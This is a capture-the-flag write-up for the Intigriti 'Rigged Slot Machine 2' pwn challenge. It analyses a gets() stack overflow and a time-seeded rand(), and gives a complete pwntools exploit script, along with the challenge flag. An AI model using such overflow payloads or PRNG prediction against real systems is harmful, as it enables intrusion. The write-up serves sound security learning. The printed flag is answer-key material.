https://ctftime.org/event/2446

# Rigged Slot Machine 2 (pwn)

The casino fixed their slot machine algorithm - good luck hitting that jackpot now! 🤭

nc riggedslot2.ctf.intigriti.io 1337

## Analysis

`main` @ `0x001014ea`
- Calls `srand(time(0))` ensuring that calls to `rand` will be predictable
- Calls `enter_name` with a buffer on the stack that is at a lower address than the balance
- After each call to `play` checks if the balance is `0x14684c`
    - If it is call `payout`

`enter_name` @ `0x00101480`
- Calls `gets` allowing us to overwrite the balance on the stack of the outer frame

`payout` @ `0x0010128c`
- Checks our balance is `0x14684c`
    - Prints the flag if it is

`play` @ `0x0010133b`
- Modifies our balance according to a supplied bet and the output of `rand`

### Getting libc

To recover the same version of libc as the remote I used `ret`'s `libc` command using the `ubuntu:23.04` tag from the `Dockerfile`:

```bash
$ ret libc ubuntu:23.04
...
$ sha256sum ./ubuntu:23.04.libc.so.6
c3a14ee6eb14cdb81f6bbd0ab94ca138597db93d5c8e7bafb5609d2f94ee0068  ./ubuntu:23.04.libc.so.6
```

https://github.com/rerrorctf/ret?tab=readme-ov-file#-libc

## Solution

1) Overwrite the balance on the stack taking care to select a value such that after playing one round of the game the resulting balance will be equal to `0x14684c`

```python
#!/usr/bin/env python3

from pwn import *
import ctypes

context.log_level = "debug"
elf = ELF("./rigged_slot2", checksec=False)
context.binary = elf

libc = ctypes.CDLL("./ubuntu:23.04.libc.so.6")

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("riggedslot2.ctf.intigriti.io", 1337)

libc.srand(libc.time(0))

# have to play at least once...
# ... and the resulting balance should be equal to 0x14684c

bet = 69
iVar2 = libc.rand() % 1000
local_c = 0

if iVar2 == 0:
    local_c = 10
elif iVar2 < 5:
    local_c = 5
elif iVar2 < 10:
    local_c = 3
elif iVar2 < 0xf:
    local_c = 2
elif iVar2 < 0x1e:
    local_c = 1

winnings = bet * local_c - bet
starting_balance = 0x14684c - winnings

payload = b""
payload += b"A" * 0x14
payload += p32(starting_balance)
p.sendlineafter(b"Enter your name:", payload)

p.sendlineafter(b"per spin): ", str(69).encode())

p.interactive() # INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}
```

## Flag
`INTIGRITI{1_w15h_17_w45_7h15_345y_1n_v3645}`

smiley 2024/11/16
